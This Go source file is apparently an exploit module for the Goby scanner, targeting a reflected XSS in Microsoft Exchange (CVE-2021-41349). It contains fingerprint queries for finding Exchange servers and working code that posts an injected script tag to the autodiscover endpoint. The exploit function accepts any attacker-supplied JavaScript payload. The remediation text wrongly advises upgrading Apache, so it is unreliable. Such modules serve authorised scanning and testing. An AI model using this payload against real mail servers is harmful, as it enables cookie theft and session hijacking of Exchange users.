package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Microsoft Exchange XSS (CVE-2021-41349)",
    "Description": "<p>Microsoft Exchange Server is a set of e-mail service programs of Microsoft Corporation. It provides mail access, storage, forwarding, voice mail, mail filtering and other functions.</p><p>Attackers can use xss vulnerabilities to obtain sensitive information such as users' cookies to further control the system.</p>",
    "Impact": "Microsoft Exchange XSS (CVE-2021-41349)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41349\">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41349</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Exchange",
    "VulType": [
        "Cross Site Script Attack"
    ],
    "Tags": [
        "Cross Site Script Attack"
    ],
    "Translation": {
        "CN": {
            "Name": "Microsoft Exchange 跨站脚本漏洞（CVE-2021-41349）",
            "Description": "<p>Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。</p><p>攻击者可使用xss漏洞获取用户的cookie等敏感信息进一步控制系统。</p>",
            "Impact": "<p>攻击者可使用xss漏洞获取用户的cookie等敏感信息进一步控制系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41349\">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41349</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Exchange",
            "VulType": [
                "跨站脚本攻击"
            ],
            "Tags": [
                "跨站脚本攻击"
            ]
        },
        "EN": {
            "Name": "Microsoft Exchange XSS (CVE-2021-41349)",
            "Description": "<p>Microsoft Exchange Server is a set of e-mail service programs of Microsoft Corporation. It provides mail access, storage, forwarding, voice mail, mail filtering and other functions.</p><p>Attackers can use xss vulnerabilities to obtain sensitive information such as users' cookies to further control the system.</p>",
            "Impact": "Microsoft Exchange XSS (CVE-2021-41349)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41349\">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-41349</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Exchange",
            "VulType": [
                "Cross Site Script Attack"
            ],
            "Tags": [
                "Cross Site Script Attack"
            ]
        }
    },
    "FofaQuery": "(header=\"owa\" || body=\"owaLgnBdy\" || banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || body=\"<!-- owapage = ASP.auth_logon_aspx\" || body=\"/exchweb/bin/auth/owalogon.asp\" || header=\"x-owa-version\" || body=\"/exchweb/bin/auth/owalogon.asp?url=\" || body=\"href=\\\"/owa/auth/\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\") || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title==\"Microsoft Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || banner=\"Set-Cookie: OutlookSession\" || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\") || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\")",
    "GobyQuery": "(header=\"owa\" || body=\"owaLgnBdy\" || banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || body=\"<!-- owapage = ASP.auth_logon_aspx\" || body=\"/exchweb/bin/auth/owalogon.asp\" || header=\"x-owa-version\" || body=\"/exchweb/bin/auth/owalogon.asp?url=\" || body=\"href=\\\"/owa/auth/\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\") || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title==\"Microsoft Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || banner=\"Set-Cookie: OutlookSession\" || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\") || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://msrc.microsoft.com/",
    "DisclosureDate": "2021-11-15",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-41349.yaml"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "6.5",
    "CVEIDs": [
        "CVE-2021-41349"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-816"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "script",
            "type": "input",
            "value": "alert(document.domain)",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [
            "Exchange"
        ],
        "System": [],
        "Hardware": []
    },
    "PocId": "10237"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/autodiscover/autodiscover.json"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `%3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 500 && strings.Contains(resp1.RawBody, "alert(document.domain);") && strings.Contains(resp1.RawBody, `a=""`) && strings.Contains(resp1.HeaderString.String(), "text/html")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			ScriptPayload := ss.Params["script"].(string)
			uri1 := "/autodiscover/autodiscover.json"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `%3Cscript%3E` + url.QueryEscape(ScriptPayload) + `%3B+a=%22%3C%2Fscript%3E&x=1`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 500 && strings.Contains(resp1.HeaderString.String(), `text/html`) {
					expResult.Output = "send success!\n\n" + resp1.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
